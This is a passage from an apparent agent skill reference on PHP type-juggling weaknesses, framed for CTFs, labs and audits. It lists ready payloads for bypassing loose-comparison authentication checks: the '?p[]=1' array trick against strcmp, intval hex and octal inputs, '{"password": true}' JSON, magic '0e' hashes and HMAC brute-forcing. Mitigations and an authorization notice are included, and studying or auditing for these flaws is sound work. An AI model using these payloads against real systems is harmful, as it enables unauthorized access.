# type-juggling — 详细参考（由 SKILL.md 拆分）

# Conceptual: try many timestamps
for t in range(T0, T1):
    if re.fullmatch(r'0e\d+', hmac_md5(str(t), key)):
        use t
```

**Mitigation**: `hash_equals($mac, $expected)` + fixed-length hex/binary encoding; never compare HMAC to bare `"0"`.

---

## 4. NULL JUGGLING (ARRAYS & TYPE ERRORS)

Invalid types can yield **`NULL`** on the compared side; loose equality to another `NULL` or coerced value may pass.

| Call | Typical PHP 7/8 behavior |
|---|---|
| `md5([])` | PHP 8: **TypeError**; older: warnings / not reliable across versions |
| `sha1([])` | Same |
| **Idea** | If error handler or custom wrapper converts failures to **`NULL`**, then `NULL == NULL` or `NULL == sha1("x")` if other side is also NULL |

```php
// CTF / broken code mental model:
@sha1($_GET['x']) == @sha1($_GET['y']);  // if both error to NULL → true
```

**Real audits**: look for **`@`**, custom `try/catch` that sets hash to `null`, or user input passed where a string is required.

---

## 5. CTF PATTERNS

### 5.1 `strcmp` / `strcasecmp` with arrays

```php
strcmp([], "password");  // NULL in PHP 7/8 (invalid args)
// NULL == 0  → true in loose compare if code does:
if (strcmp($_GET['p'], $secret) == 0)
```

Payload:

```text
?p[]=1
```

### 5.2 `intval` bypass

```php
// Hex: base 0 lets PHP interpret 0x prefix (version-dependent; always verify)
intval("0x1A", 0);   // → 26

// Octal: leading 0 can be parsed as octal with base 0
intval("010", 0);  // → 8 (classic teaching example; confirm on target PHP)

// Scientific notation: intval() alone stops at 'e'; cast via float first
intval((float) "1e2"); // → 100
```

```text
?id=0x1A
?id=010
?id=1e2
```

### 5.3 `json_decode` + `true` for associative array auth

```json
{"password": true}
```

```php
$j = json_decode($input, true);
if ($j['password'] == $stored_string) // true == "nonempty" often true — see PHP loose rules
```

### 5.4 `is_numeric` + loose compare

```php
is_numeric("0e12345");  // true
"0e12345" == 0;         // true (scientific notation → 0.0)
```

### 5.5 Deserialization + magic properties

Unserialize user input into objects whose `__toString` or properties feed into `md5($obj)` or loose compare — combine with **magic hash** strings on properties (CTF). Look for `unserialize($_…)` near `==` on hashes.

---

## 6. DECISION TREE

```text
                         +------------------+
                         | PHP loose compare|
                         | or hash == hash? |
                         +--------+---------+
                                  |
                    +-------------+-------------+
                    |                           |
             +------v------+             +------v------+
             | Uses === or |             | Uses == or   |
             | hash_equals |             | strcmp == 0  |
             +------+------+             +------+-------+
                    |                           |
               STOP (likely)              +-----v-----+
                                          | Operand   |
                                          | types?    |
                                          +-----+-----+
                           +--------------+---+--------------+
                           |              |                  |
                    +------v------+ +-----v-----+    +-------v--------+
                    | Both numeric| | One int & |    | Hash digests   |
                    | strings 0e… | | one string|    | both 0e\d+ ?   |
                    +------+------+ +-----+-----+    +-------+--------+
                           |              |                  |
                      MAGIC HASH    STRING/INT           MAGIC HASH
                      COLLISION     JUGGLING             (md5/sha1/…)
                           |              |                  |
                           +------+-------+------------------+
                                  |
                           +------v------+
                           | HMAC / MAC  |
                           | vs "0"      |
                           +------+------+
                                  |
                           brute $data
                           for 0e… digest
                                  |
                           +------v------+
                           | Arrays /    |
                           | json true / |
                           | strcmp([])  |
                           +-------------+
```

### Tool references

| Tool | Use |
|---|---|
| Local `php` CLI | Reproduce `==` behavior for target major version |
| Static code review | Grep `==`, `!=` on crypto outputs; find missing `hash_equals` |
| CTF frameworks | Payload generators for magic hashes and `0e` search |

---

**Safety & scope**: Use only on **authorized** targets (CTF, lab, written permission). This skill explains **language semantics** for defense and assessment — not a license to attack systems without consent.
